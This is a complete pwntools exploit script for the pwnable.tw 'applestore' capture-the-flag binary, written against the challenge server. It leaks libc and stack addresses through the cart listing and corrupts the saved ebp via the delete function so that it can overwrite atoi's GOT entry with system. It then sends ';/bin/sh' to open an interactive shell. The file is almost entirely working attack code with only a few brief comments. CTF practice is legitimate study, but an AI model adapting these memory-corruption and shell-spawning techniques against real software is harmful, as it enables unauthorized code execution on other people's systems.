#!  /usr/bin/env python
from pwn import *

# p = process('./applestore')
context.log_level = 'debug'

'''
control ebp to control the stack, so can modify atoi got
'''

def addDevice(device_num):
    p.recvuntil('> ')
    p.sendline('2')
    p.recvuntil('Device Number> ')
    p.sendline(device_num)

def checkout():
    p.recvuntil('>')
    p.sendline('5')
    p.recvuntil('(y/n) >')
    p.sendline('y')

def cart(payload):
    p.recvuntil('>')
    p.sendline('4')
    p.recvuntil('(y/n) >')
    p.sendline(payload)

def delete(payload):
    p.recvuntil('>')
    p.sendline('3')
    p.recvuntil('Item Number>')
    p.sendline(payload)


if __name__ == '__main__':
    p = remote('chall.pwnable.tw', 10104)
    apple = ELF('./applestore')
    libc = ELF('./libc_32.so.6')
    #print("pid : " + str(proc.pidof(p)))
    #raw_input('attach me ')
    for i in range(20):
        addDevice('2')

    for i in range(6):
        addDevice('1')

    checkout()

    # leak libc address
    payload = 'y\x00' + p32(apple.got['atoi']) + '\x00\x00\x00\x00' * 3
    #addDevice(payload)
    cart(payload)
    p.recvuntil('27: ')
    atoi_addr = u32(p.recvline()[0:4])
    atoi_libc = libc.symbols['atoi']
    libc_base = atoi_addr - atoi_libc
    log.info('atoi address is ' + hex(atoi_addr))
    log.info('atoi address in libc is ' + hex(atoi_libc))
    log.info('libc base address is ' + hex(libc_base))

    libc.address = libc_base

    # leak the stack address
    environ_addr = libc.symbols['environ']
    payload = 'y\x00' + p32(environ_addr) + '\x00\x00\x00\x00' * 3
    cart(payload)
    p.recvuntil('27: ')
    environ_addr = u32(p.recvline()[0:4])
    log.info('environ address is ' + hex(environ_addr))
    ebp_address = environ_addr - 0x104

    # delete, write the ebp to the atoi+0x22
    payload = '27' + p32(0x08049002) + p32(0) + p32(apple.got['atoi'] + 0x22) + p32(ebp_address - 0x8)
    # gdb.attach(p, '''
    # break *0x8048a3d
    # ''')
    delete(payload)
   

    # attack, set the atoi got to system addr, and execute the system('/bin/sh')
    payload = p32(libc.symbols['system']) + ';/bin/sh\x00'
    p.recvuntil('>')
    p.sendline(payload)


    p.interactive()